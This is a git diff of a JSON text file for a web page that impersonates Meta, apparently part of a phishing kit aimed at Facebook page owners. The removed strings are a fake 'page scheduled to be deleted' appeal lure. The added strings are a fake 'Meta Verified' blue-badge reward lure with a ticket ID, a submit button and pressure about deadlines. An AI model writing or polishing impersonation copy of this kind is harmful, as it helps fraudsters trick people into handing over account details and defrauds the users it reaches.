@@ -47,29 +47,29 @@
     },
     "content": {
         "top_content": {
-            "title": "We have scheduled your page to be deleted",
+            "title": "Meta Verified - Rewards For You", 
             "sub": {
-                "sub_1": "We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.",
-                "sub_2": "If you believe restrictions have been placed on your account in error, you can request a review."
+                "sub_1": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+                "sub_2": "We’re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!"
             },
-            "ticket": "Your ticket id:"
+            "ticket": "Your Ticket ID "
         },
         "guide": {
-            "title": "Appeal Guide",
+            "title": "✅ Verified Blue Badge Request Guide",
             "sub": {
-                "sub_1": "Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
-                "sub_2": "In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
-                "sub_3": "When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated."
+                "sub_1": " Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats",
+                "sub_2": " In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.",
+                "sub_3": " Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly."
             }
         },
         "thumb": {
-            "title": "Fixing problems with account restrictions",
+            "title": "Verification Review",
             "sub": {
                 "sub_1": "Review request",
-                "sub_2": "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal."
+                "sub_2": "Processing typically takes 24–48 hours. Your account will be reviewed for any policy restrictions."
             },
-            "button": "Request Review",
-            "day": "Your page was restricted on"
+            "button": "Submit request",
+            "day": "You were verified on"
         },
         "appeal_guide": {
             "title": "Appeal Guide",
